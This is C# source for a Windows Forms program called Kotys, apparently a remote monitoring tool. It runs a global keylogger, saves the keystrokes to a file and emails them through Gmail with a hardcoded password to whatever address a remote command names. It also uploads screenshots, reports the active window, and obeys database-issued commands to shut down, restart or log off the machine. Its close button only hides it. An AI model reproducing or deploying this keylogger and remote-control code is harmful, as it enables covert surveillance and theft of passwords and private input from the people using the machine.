using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MetroFramework;
using MetroFramework.Forms;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;


namespace Kotys
{
    public partial class Form1 : MetroForm
    {
        GlobalKeyboardHook gHook;
        RichTextBox textKeylogger = new RichTextBox();

        public bool logat { get; set; }

        public string Guser { get; set; }
        public string GNume { get; set; }
        public string GPrenume { get; set; }
        public string GRank { get; set; }

        public int checkTimer = 1000;
        public int timerInterval = 50000;
        

        public bool isActive;

        DBConnect dbConnect = new DBConnect();

        public string deviceID;

        public Form1()
        {
            
            InitializeComponent();
            deviceIDLabel.Text = deviceID;
            DateTime dateTime = DateTime.UtcNow.Date;
            string data = dateTime.ToString("dd/MM/yyyy");
            string time = DateTime.Now.ToString("h:mm:ss");
            writeLog(deviceID, "Device started", data, time);
            if (isActive)
            {
                if (dbConnect.InsertReport(deviceID, "Device started", data, time) == true)
                {
                    
                }
                else
                {
                    writeReport(deviceID, "Device started", data, time);
                }
            }
            timer1.Interval = checkTimer;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            getDevIDData();
            initialise();
            readDataFile();
            WriteData();
            LastSeen();
            
            takeSS();

            if (isActive == true)
            {
                timer1.Start();
                startKeylogger();
            }
            else
            {
                timer1.Stop();
                stopKeylogger();
            }
        }

    
        public void initialise()
        {
            if(logat)
            {
                buttonLogIn.Visible = false;
                buttonLogOut.Visible = true;
                activeToggle.Enabled = true;
                deviceIDLabel.Text = deviceID + " ~ " + Guser;
                buttonSettings.Visible = true;
                WriteData();
                timer1.Interval = 18000;
                

            }else
            {
                buttonLogIn.Visible = true;
                buttonLogOut.Visible = false;
                activeToggle.Enabled = false;
                buttonSettings.Visible = false;
                
            }
            LastSeen();
            getTimerIntervalData();

        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;

            new CancelEventArgs().Cancel = true;
            this.Hide();
            ShowInTaskbar = true;
        }

         private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
        }

         private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
         {
             this.Show();
            
         }

         private void buttonLogIn_Click(object sender, EventArgs e)
         {
             LogInForm lf = new LogInForm();
             lf.RefToForm1 = this;
             lf.Show();
             this.Hide();
         }
       
        public bool FileDataExists()
         {
             if (File.Exists("data.dat"))
             {
                 return true;
             }else
             {
                 return false;
             }
         }

        public bool FileDeviceExists()
        {
            if (File.Exists("device.dat"))
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public bool FileIntervalExists()
        {
            if (File.Exists("timer.dat"))
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public void WriteData()
        {
            if(FileDataExists())
            {
                try
                {
                    File.Delete("data.dat");
                    using (StreamWriter w = File.AppendText("data.dat"))
                    {
                        w.WriteLine(isActive.ToString());
                    }
                }
                catch(Exception e)
                {
                    MessageBox.Show(e.ToString());
                }
            }else
            {
                newDevice();
                using (StreamWriter w = File.AppendText("data.dat"))
                {
                    w.WriteLine(isActive.ToString());
                }
               
            }
        }

        private void activeToggle_CheckedChanged(object sender, EventArgs e)
        {
            if (activeToggle.Checked == true)
            {
                isActive = true;
                dbConnect.UpdateActive(deviceID, true);

                 DateTime dateTime = DateTime.UtcNow.Date;
                  string data = dateTime.ToString("dd/MM/yyyy");
                  string time = DateTime.Now.ToString("h:mm:ss");
                  dbConnect.InsertReport(deviceID, "Device is now active", data, time);
                  writeLog(deviceID, "Device is now active", data, time);
                  timer1.Start();
                  startKeylogger();

            }
            else
            {
                isActive = false;
                dbConnect.UpdateActive(deviceID, false);
                DateTime dateTime = DateTime.UtcNow.Date;
                string data = dateTime.ToString("dd/MM/yyyy");
                string time = DateTime.Now.ToString("h:mm:ss");
                dbConnect.InsertReport(deviceID, "Device is not active anymore", data, time);
                writeLog(deviceID, "Device is not active anymore", data, time);
                timer1.Stop();
                stopKeylogger();
            }
            WriteData();
            LastSeen();
        }

        public void readDataFile()
        {
            if (FileDataExists())
            {
                using (StreamReader sr = new StreamReader("data.dat"))
                {
                    string s2 = sr.ReadLine();

                    if (s2 == "True")
                    {
                        isActive = true;
                        activeToggle.Checked = true;
                        timer1.Start();
                    }
                    else
                    {
                        isActive = false;
                        activeToggle.Checked = false;
                        timer1.Stop();
                    }
                }
            }
        }

        public void newDevice()
        {

        }

        public void LastSeen()
        {
            dbConnect.UpdateLastSeen(deviceID);
            dbConnect.updateActiveWindow(deviceID, GetActiveWindowTitle());
             DateTime dateTime = DateTime.UtcNow.Date;
             string data = dateTime.ToString("dd/MM/yyyy");
             string time = DateTime.Now.ToString("h:mm:ss");
            writeLog(deviceID, "Is still online",data,time);
            writeLog(deviceID, "ActiveWindow:" + GetActiveWindowTitle(), data, time);
           
        }

        private void timerLastSeen_Tick(object sender, EventArgs e)
        {
            LastSeen();
        }
       
        public void getTimerIntervalData()
        {
            if (FileIntervalExists())
            {
                using (StreamReader sr = new StreamReader("timer.dat"))
                {
                    string s2 = sr.ReadLine();
                    int interval = int.Parse(s2);
                    timerInterval = interval;
                    timerLastSeen.Interval = interval;
                    timerLastSeen.Start();
                }
            }
        }

        public void getDevIDData()
        {
            if (FileDeviceExists())
            {
                using (StreamReader sr = new StreamReader("device.dat"))
                {
                    string s2 = sr.ReadLine();
                    deviceID = s2;
                }
            }
        }

        private void settingsButton_Click(object sender, EventArgs e)
        {
//worng one
        }

        private void button1_Click(object sender, EventArgs e)
        {
            FormSettings fs = new FormSettings();
            fs.RefToForm1 = this;
            fs.Show();
            //la final call these and close form2 
            /* getdevidata
             * gettimerintervaldata
             * */
        }

        private void sendReport()
        {

        }

        private void writeReport(string devID, string info, string data, string time)
        {
            try
            {
                
                using (StreamWriter w = File.AppendText("querycmds.dat"))
                {
                    w.WriteLine(devID + "~" + info + "~" + data + "~" + time +";");
                }
            }
            catch (Exception z)
            {
                MessageBox.Show(z.ToString());
            }
        }

        public void writeLog(string devID, string info, string data, string time)
        {
            try
            {

                using (StreamWriter w = File.AppendText("logcmds.dat"))
                {
                    w.WriteLine(devID + "~" + info + "~" + data + "~" + time + ";");
                }
            }
            catch (Exception z)
            {
                MessageBox.Show(z.ToString());
            }
        }

        public void takeSS()
        {
            System.IO.FileInfo file = new System.IO.FileInfo(string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
                      @"\Kotys\"));
            file.Directory.Create();
            Bitmap memoryImage = new Bitmap(1900, 1600);
            Size s = new Size(memoryImage.Width, memoryImage.Height);

          
            Graphics memoryGraphics = Graphics.FromImage(memoryImage);

           
            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
            DateTime dateTime = DateTime.UtcNow.Date;
            string data = dateTime.ToString("dd/MM/yyyy");
            string time = DateTime.Now.ToString("h/mm/ss");
            //That's it! Save the image in the directory and this will work like charm. 
            string str = "";
            string FlName = "";
            try
            {
                FlName = "Screenshot-" + deviceID + "-" + data + "-" + time + ".png";
                str = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
                      @"\Kotys\" + FlName);
            }
            catch (Exception er)
            {
               
            }

            // Save it! 
            
            memoryImage.Save(str);

            // Write the message, 
           
            // Pause the program to show the message. 
            writeLog(deviceID, "A screenshot has been taken. Name:" + FlName, data, time);
            uploadSS(str, FlName);
        }

        public void uploadSS(string dir, string name)
        {
            DateTime dateTime = DateTime.UtcNow.Date;
            string data = dateTime.ToString("dd/MM/yyyy");
            string time = DateTime.Now.ToString("h/mm/ss");
            System.Net.WebClient Client = new System.Net.WebClient ();
            Client.Headers.Add("Content-Type","binary/octet-stream");
            byte[] result = Client.UploadFile ("http://127.0.0.1/machines/uploadss.php","POST",dir);
            String s = System.Text.Encoding .UTF8 .GetString (result,0,result.Length );
           
            dbConnect.InsertReport(deviceID, "Screenshot taken", data, time);
            int lastId = dbConnect.getLastReportRepID(deviceID);
            dbConnect.InsertReportInfo(lastId.ToString(), "Screenshot take", "http://127.0.0.1/machines/ss/"+name, "");
            
        }

        private void buttonLogOut_Click(object sender, EventArgs e)
        {
            DateTime dateTime = DateTime.UtcNow.Date;
            string data = dateTime.ToString("dd/MM/yyyy");
            string time = DateTime.Now.ToString("h:mm:ss");
            logat = false;
            initialise();
            dbConnect.InsertReport(deviceID, "Logged Out", data, time);
            writeLog(deviceID, "Logged Out", data, time);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
             DateTime dateTime = DateTime.UtcNow.Date;
            string data = dateTime.ToString("dd/MM/yyyy");
            string time = DateTime.Now.ToString("h/mm/ss");

            string get = dbConnect.getToDoCommand(deviceID);
            if (get != "")
            {
                string[] cmd = get.Split('~');
                string command = cmd[0];
                string identity = cmd[1];

                switch (command.Substring(0, 3))
                {
                    case "201": MessageBox.Show(command.Substring(3)); dbConnect.InsertReport(deviceID, "MessageBox: " + command.Substring(3), data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "MessageBox: " + command.Substring(3), data, time); break;
                    case "231": try { mciSendStringA("set CDAudio door open", rt, 127, 0); }
                        catch (Exception s) { }; dbConnect.InsertReport(deviceID, "CD Opened ", data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "CD Opened", data, time); break;
                    case "211": takeSS();  dbConnect.setCommandAsDone(identity); writeLog(deviceID, "ScreenShotTaken", data, time); break;
                    case "212": dbConnect.updateActiveWindow(deviceID, GetActiveWindowTitle()); dbConnect.InsertReport(deviceID, "ActiveWindow: " + GetActiveWindowTitle(), data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "ActiveWindow:" + GetActiveWindowTitle(), data, time); break;
                    case "232": dbConnect.InsertReport(deviceID, "ShuttedDown", data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "ShuttedDown", data, time); PCShutDown(); break;
                    case "233": dbConnect.InsertReport(deviceID, "Restarted", data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "Restarted", data, time); PCRestart(); break;
                    case "234": dbConnect.InsertReport(deviceID, "LoggedOff", data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "LoggedOff", data, time); PCLogOff(); break;
                    case "213": sendEmailWithKeys(command.Substring(3)); dbConnect.InsertReport(deviceID, "Keylogger sent to:" + command.Substring(3), data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "Keylogger sent to:" + command.Substring(3), data, time); break;
                }
            }

        }

        string rt = "";

        [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
        public static extern void mciSendStringA(string lpstrCommand,
               string lpstrReturnString, long uReturnLength, long hwndCallback);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        void PCShutDown()
        {
            Process.Start("shutdown", "/s /t 0"); 
        }


        void PCRestart()
        {
            Process.Start("shutdown","/r /t 0");
        }

        void PCLogOff()
        {
            ExitWindowsEx(0, 0);

        }

        [DllImport("user32")]
        public static extern bool ExitWindowsEx(uint uFlags, uint dwReason);

        void startKeylogger()
        {
            gHook = new GlobalKeyboardHook(); // Create a new GlobalKeyboardHook
            // Declare a KeyDown Event
            gHook.KeyDown += new KeyEventHandler(gHook_KeyDown);
            // Add the keys you want to hook to the HookedKeys list
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
                gHook.HookedKeys.Add(key);
            gHook.hook();
            timerKeylogger.Interval = 20000;
            timerKeylogger.Start();
        }

        void stopKeylogger()
        {
            gHook.unhook();
        }

        public void gHook_KeyDown(object sender, KeyEventArgs e)
        {
            
            textKeylogger.Text += ((char)e.KeyValue).ToString();
        }

        private void timerKeylogger_Tick(object sender, EventArgs e)
        {
            DateTime dt = DateTime.Now;
            try
            {

                using (StreamWriter w = File.AppendText("syek.dat"))
                {
                    w.WriteLine(dt + "~" + textKeylogger.Text);
                    textKeylogger.Text = "";
                }
            }
            catch (Exception z)
            {
                MessageBox.Show(z.ToString());
            }
        }

        void sendEmailWithKeys(string email)
        {
            DateTime dt = DateTime.Now;
            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential("kotys.mailbot@gmail.com", "1cffd0c30cf9382f")
            };
            using (var message = new MailMessage("kotys.mailbot@gmail.com", email)
            {
                Subject = "Kotys Keylogger at " + dt,
                Body = File.ReadAllText("syek.dat")
            })
            {
                smtp.Send(message);
                try
                {
                    File.Delete("syek.dat");
                }
                catch(Exception s)
                {
                    MessageBox.Show(s.ToString());
                }
            }
        }
     
    }
}
